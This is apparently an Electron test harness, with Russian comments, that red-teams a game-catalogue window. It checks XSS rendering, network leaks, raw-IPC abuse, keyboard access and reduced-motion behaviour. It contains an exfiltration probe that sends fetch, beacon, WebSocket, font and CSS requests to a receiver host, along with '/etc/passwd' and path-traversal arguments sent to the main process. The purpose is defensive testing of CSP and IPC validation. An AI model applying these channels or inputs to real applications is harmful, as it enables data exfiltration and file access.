'use strict';
/* Главный процесс Electron для проверок окна витрины. Режимы:
   vitrina:         настоящая витрина, К23 (разметка и сеть), В3–В5 через интерфейс, В11 шрифты, В12 клавиатура и движение;
   vitrina-ipc:     настоящая витрина плюс тестовый мост к сырому ipcRenderer, как если бы окно было взломано (В9);
   vitrina-control: та же витрина без CSP, без закрытой сессии и с innerHTML вместо textContent: атаки обязаны сработать;
   shots:           снимки экрана для docs/img. */
const fs = require('fs');
const path = require('path');
const { app, BrowserWindow, session } = require('electron');
const sandbox = require('../desktop/sandbox');
const W = require('../desktop/vitrina/window');

const cfg = JSON.parse(process.env.REDTEAM_CONFIG);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

sandbox.registerSchemes();
if (cfg.mode !== 'vitrina-control') sandbox.hardenApp();

function finish(result) {
  fs.writeFileSync(cfg.out, JSON.stringify(result, null, 1));
  app.exit(0);
}

async function waitFor(fn, ms = 10000) {
  const until = Date.now() + ms;
  for (;;) {
    const value = await fn();
    if (value) return value;
    if (Date.now() > until) return value;
    await sleep(100);
  }
}

const js = (win, code, gesture = true) => win.webContents.executeJavaScript(code, gesture);
const click = (win, selector) => js(win, `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return false; el.click(); return true; })()`);
const cardsReady = (win) => waitFor(() => js(win, "document.querySelectorAll('.card').length"));
const overlayText = (win) => js(win, "document.getElementById('overlay').hidden ? '' : document.getElementById('overlay').innerText");

/* Атаки на сеть из окна витрины, как если бы в нём выполнился чужой код. Каждая отмечается своим путём у приёмника. */
const NET_ATTACKS = `(async () => {
  const base = 'http://${cfg.host}:${cfg.http}/hit/';
  try { await fetch(base + 'k23-fetch', { mode: 'no-cors' }); } catch (e) {}
  const img = new Image(); img.src = base + 'k23-img'; document.body.append(img);
  try { new WebSocket('ws://${cfg.host}:${cfg.http}/hit/k23-ws'); } catch (e) {}
  try { navigator.sendBeacon(base + 'k23-beacon', 'x'); } catch (e) {}
  try { new FontFace('Leak', 'url(' + base + 'k23-font)').load().catch(() => {}); } catch (e) {}
  const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = base + 'k23-css'; document.head.append(link);
  // iframe на http не проверяется: Chromium не загрузил его и без защиты (смешанное содержимое), такой канал ничего не доказывает
  await new Promise((r) => setTimeout(r, 2000));
  return true;
})()`;
const NET_CHANNELS = ['k23-xss', 'k23-fetch', 'k23-img', 'k23-ws', 'k23-beacon', 'k23-font', 'k23-css'];

/* Что окно показало вместо разметки из каталога */
async function xssProbe(win) {
  await cardsReady(win);
  await click(win, '.card[data-id="xss-nazvanie"]');
  await sleep(1500);
  return js(win, `(() => ({
    executed: typeof window.__k23 === 'undefined' ? null : window.__k23,
    cardTitle: (document.querySelector('.card[data-id="xss-nazvanie"] .card-title') || {}).textContent || null,
    modalTitle: (document.querySelector('.modal h2') || {}).textContent || null,
    tabText: [...document.querySelectorAll('.tab')].map((t) => t.textContent),
    injected: document.querySelectorAll('img[src="x"], svg[onload], b[onmouseover], main script, #overlay script').length,
  }))()`);
}

/* ---------- vitrina-control ---------- */
async function control() {
  const { loadCatalog } = require('../desktop/vitrina/catalog');
  const { createStore } = require('../desktop/vitrina/store');
  const { CHANNELS, createApi } = require('../desktop/vitrina/api');
  const catalog = await loadCatalog(cfg.catalogDir, { trustedKeys: cfg.trustedKeys, appVersion: '1.0.0' });
  const ui = W.loadUi();
  const appJs = ui.get('app.js');
  const source = appJs.data.toString('utf8');
  const marker = '/*K23*/el.textContent';
  const replaced = source.split(marker).length - 1;
  ui.set('app.js', { ...appJs, data: Buffer.from(source.split(marker).join('/*K23*/el.innerHTML')) });
  const ses = session.fromPartition('kibapp-control');
  W.serveVitrina(ses, { ui, covers: () => catalog.covers, csp: null });
  const win = W.createVitrinaWindow({ ses, show: false, allowInsecure: true });
  win.showInactive();
  const api = createApi({ getCatalog: () => catalog, store: createStore(cfg.dataDir), launch: async () => ({ ok: true }), played: new Set() });
  for (const channel of CHANNELS) win.webContents.ipc.handle(channel, (_e, ...args) => api[channel](...args));
  await win.loadURL(W.START_URL);
  const xss = await xssProbe(win);
  await js(win, NET_ATTACKS);
  await sleep(500);
  finish({ replaced, xss });
}

/* ---------- vitrina ---------- */
async function hardened() {
  const { openVitrina } = require('../desktop/vitrina');
  await sandbox.lockDefaultSession();
  const events = [];
  const v = await openVitrina({ catalogDir: cfg.catalogDir, dataDir: cfg.dataDir, appVersion: '1.0.0', trustedKeys: cfg.trustedKeys,
    show: false, log: (kind, detail) => events.push({ kind, detail }) });
  const win = v.window;
  win.showInactive(); // у скрытого окна Chromium не проигрывает анимации
  win.setContentSize(1366, 768);
  const r = {};

  // К23: разметка из каталога видна как текст, сеть закрыта
  r.xss = await xssProbe(win);
  r.surface = await js(win, `(() => {
    let tt = 'allowed';
    try { document.createElement('div').innerHTML = '<b>x</b>'; } catch (e) { tt = 'blocked'; }
    return { trustedTypes: tt, require: typeof require, process: typeof process, k1: Object.keys(window.k1 || {}).sort() };
  })()`);
  await js(win, NET_ATTACKS);
  await sleep(500);
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);

  // В11: шрифты загружены из приложения
  r.fonts = await js(win, `document.fonts.ready.then(() => [...document.fonts].filter((f) => f.status === 'loaded').map((f) => f.family.replace(/"/g, '')))`);

  // В3: «Играть» открывает выбранный режим, после закрытия окно оценки этого режима
  const gameWindow = async (action) => {
    const before = new Set(BrowserWindow.getAllWindows());
    await action();
    const w = await waitFor(() => BrowserWindow.getAllWindows().find((x) => !before.has(x)), 10000);
    if (!w) return null;
    await waitFor(() => !w.webContents.isLoading() && w.webContents.getURL());
    await sleep(300);
    return w;
  };
  const playMode = async (gameId, modeTitle) => {
    await click(win, `.card[data-id="${gameId}"]`);
    await sleep(400);
    if (modeTitle) await js(win, `[...document.querySelectorAll('.tab')].find((t) => t.textContent === ${JSON.stringify(modeTitle)}).click()`);
    return gameWindow(() => click(win, '.btn-play'));
  };
  const closeGame = async (g) => { g.close(); await waitFor(() => g.isDestroyed()); await sleep(700); };

  const custom = await playMode('tri-rezhima', 'Свой путь');
  r.custom = custom ? { url: custom.webContents.getURL(), text: await custom.webContents.executeJavaScript('document.body.innerText') } : null;
  if (custom) await closeGame(custom);
  r.afterClose = await overlayText(win);

  const ratingsFile = path.join(cfg.dataDir, 'ratings.json');
  const stateFile = path.join(cfg.dataDir, 'state.json');
  const readJson = (f) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return null; } };

  // В4 вживую: звезда, «Отменить», 5 с ожидания: ничего не записано
  await click(win, '.star:nth-child(4)');
  await sleep(1000);
  r.counting = await overlayText(win);
  await click(win, '.btn-undo');
  await sleep(5600);
  r.afterUndo = { ratings: readJson(ratingsFile), state: readJson(stateFile), text: await overlayText(win) };
  // Звезда 5 и 5 с: записано
  await click(win, '.star:nth-child(5)');
  await sleep(4500);
  r.at45 = readJson(ratingsFile);
  await sleep(1500);
  r.afterSend = { ratings: readJson(ratingsFile), state: readJson(stateFile), text: await overlayText(win) };
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);

  // В5 вживую: тот же режим снова в тот же день
  const again = await playMode('tri-rezhima', 'Свой путь');
  if (again) await closeGame(again);
  r.again = await overlayText(win);
  r.againIpc = await js(win, "window.k1.vote('tri-rezhima', 'custom', 3)");
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);

  // Игра без режимов: адрес без ?mode
  const plain = await playMode('kiberpochta');
  r.plainUrl = plain ? plain.webContents.getURL() : null;
  if (plain) await closeGame(plain);
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);

  // В12: клавиатура. Фокус на карточке, Enter, Tab по кругу внутри окна, Esc, фокус вернулся
  const key = async (keyCode, shift = false) => {
    const modifiers = shift ? ['shift'] : [];
    win.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
    win.webContents.sendInputEvent({ type: 'char', keyCode, modifiers });
    win.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
    await sleep(120);
  };
  win.webContents.focus();
  await js(win, "document.querySelector('.card[data-id=\"tri-rezhima\"]').focus()");
  await key('Return');
  await sleep(400);
  const active = () => js(win, "(() => { const a = document.activeElement; return { inModal: !!a.closest('.modal'), cls: a.className, text: a.textContent.trim().slice(0, 30), id: a.dataset ? a.dataset.id || null : null }; })()");
  r.kbOpen = await active();
  r.kbTabs = [];
  for (let i = 0; i < 8; i += 1) { await key('Tab'); r.kbTabs.push(await active()); }
  for (let i = 0; i < 3; i += 1) { await key('Tab', true); r.kbTabs.push(await active()); }
  await key('Escape');
  await sleep(400);
  r.kbClosed = { overlayHidden: await js(win, "document.getElementById('overlay').hidden"), focus: await active() };

  // В12: кнопки не меньше 44 px (звёзды 64), на витрине, в окне игры и в окне оценки
  const sizes = () => js(win, `[...document.querySelectorAll('button')].filter((b) => b.getClientRects().length && !b.closest('[aria-hidden="true"]'))
    .map((b) => { const r = b.getBoundingClientRect(); return { cls: b.className, w: Math.round(r.width), h: Math.round(r.height) }; })`);
  r.sizes = [...await sizes()];
  await click(win, '.card[data-id="tri-rezhima"]');
  await sleep(400);
  r.sizes.push(...await sizes());
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);
  win.webContents.send('game.closed', { id: 'kiberpochta', mode: 'default' });
  await sleep(500);
  r.sizes.push(...(await sizes()).map((s) => ({ ...s, rate: true })));
  await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
  await sleep(400);

  // В12: анимации есть по умолчанию и пропадают при prefers-reduced-motion
  const animationsOnOpen = async () => {
    await click(win, '.card[data-id="kiberpochta"]');
    const n = await js(win, 'document.getAnimations().length', false);
    await sleep(400);
    await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
    await sleep(500);
    return n;
  };
  r.motionNormal = await animationsOnOpen();
  win.webContents.debugger.attach('1.3');
  await win.webContents.debugger.sendCommand('Emulation.setEmulatedMedia', { features: [{ name: 'prefers-reduced-motion', value: 'reduce' }] });
  r.motionReduced = await animationsOnOpen();
  r.motionMatch = await js(win, "matchMedia('(prefers-reduced-motion: reduce)').matches");
  win.webContents.debugger.detach();

  r.events = events;
  finish(r);
}

/* ---------- vitrina-ipc ---------- */
async function ipcProbe() {
  const { openVitrina } = require('../desktop/vitrina');
  await sandbox.lockDefaultSession();
  // Тестовый мост: даёт странице сырой ipcRenderer. Так ведёт себя окно, в котором злоумышленник уже выполнил код
  // и обошёл изоляцию контекста. Проверяется, что основной процесс сам отбрасывает лишнее.
  const ses = session.fromPartition(W.PARTITION);
  const preload = path.join(__dirname, 'vitrina-raw-preload.js');
  if (ses.registerPreloadScript) ses.registerPreloadScript({ type: 'frame', filePath: preload });
  else ses.setPreloads([preload]);
  const v = await openVitrina({ catalogDir: cfg.catalogDir, dataDir: cfg.dataDir, appVersion: '1.0.0', trustedKeys: cfg.trustedKeys, show: false });
  const win = v.window;
  await cardsReady(win);
  const call = (channel, ...args) => js(win, `window.__raw.invoke(${JSON.stringify(channel)}, ...${JSON.stringify(args)})
    .then((v) => ({ ok: true, value: v }), (e) => ({ ok: false, error: String(e && e.message).slice(0, 160) }))`);
  const r = { rawReady: await js(win, 'typeof window.__raw') };
  r.unknown = {};
  for (const channel of ['fs.readFile', 'server.setAddress', 'shell.openExternal', 'game.closed', 'catalog.list ', 'CATALOG.LIST']) r.unknown[channel] = await call(channel, '/etc/passwd');
  r.badArgs = {
    launchUnknownGame: await call('game.launch', 'chuzhaya-igra', 'default'),
    launchPathGame: await call('game.launch', '../../etc/passwd', 'default'),
    launchUnknownMode: await call('game.launch', 'tri-rezhima', 'exam'),
    launchPathMode: await call('game.launch', 'tri-rezhima', '../custom.html'),
    launchObject: await call('game.launch', { id: 'tri-rezhima' }, 'training'),
    launchExtraArg: await call('game.launch', 'tri-rezhima', 'training', 'C:\\Windows\\notepad.exe'),
    voteUnplayed: await call('vote.send', 'tri-rezhima', 'training', 5),
    voteSix: await call('vote.send', 'tri-rezhima', 'training', 6),
    voteString: await call('vote.send', 'tri-rezhima', 'training', '5'),
    voteUnknownGame: await call('vote.send', 'chuzhaya-igra', 'default', 5),
    listWithArg: await call('catalog.list', '/etc'),
  };
  // Контроль: верные вызовы работают, значит отказы выше настоящие
  r.good = { list: await call('catalog.list') };
  r.good.launch = await call('game.launch', 'tri-rezhima', 'training');
  await sleep(500);
  for (const w of BrowserWindow.getAllWindows()) if (w !== win) w.destroy();
  await sleep(300);
  r.good.vote = await call('vote.send', 'tri-rezhima', 'training', 4);
  r.good.voteAgain = await call('vote.send', 'tri-rezhima', 'training', 4);
  r.listShape = r.good.list.ok ? Object.keys(r.good.list.value.games[0]).sort() : null;
  finish(r);
}

/* ---------- shots ---------- */
async function shots() {
  const { openVitrina } = require('../desktop/vitrina');
  await sandbox.lockDefaultSession();
  const v = await openVitrina({ catalogDir: cfg.catalogDir, dataDir: cfg.dataDir, appVersion: '1.0.0', trustedKeys: cfg.trustedKeys, show: false });
  const win = v.window;
  win.showInactive();
  v.played.add('kiberpochta/default');
  const done = [];
  const snap = async (name) => {
    await sleep(500);
    const image = await win.webContents.capturePage();
    const file = path.join(cfg.shotDir, name);
    fs.writeFileSync(file, image.toPNG());
    done.push({ file, size: image.getSize() });
  };
  for (const [w, h] of [[1366, 768], [1920, 1080]]) {
    win.setContentSize(w, h);
    await cardsReady(win);
    await sleep(800);
    await snap(`v0-vitrina-${w}.png`);
    await click(win, '.card[data-id="tri-rezhima"]');
    await snap(`v0-okno-igry-${w}.png`);
    await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
    await sleep(400);
    win.webContents.send('game.closed', { id: 'kiberpochta', mode: 'default' });
    await sleep(400);
    await snap(`v0-ocenka-${w}.png`);
    await click(win, '.star:nth-child(4)');
    await sleep(1600);
    await snap(`v0-ocenka-otmena-${w}.png`);
    await click(win, '.btn-undo');
    await js(win, "document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' }))");
    await sleep(400);
  }
  finish({ done });
}

const MODES = { vitrina: hardened, 'vitrina-ipc': ipcProbe, 'vitrina-control': control, shots };
app.on('window-all-closed', () => {});
app.whenReady().then(MODES[cfg.mode]).catch((err) => {
  fs.writeFileSync(cfg.out, JSON.stringify({ fatal: String(err && err.stack) }));
  app.exit(4);
});
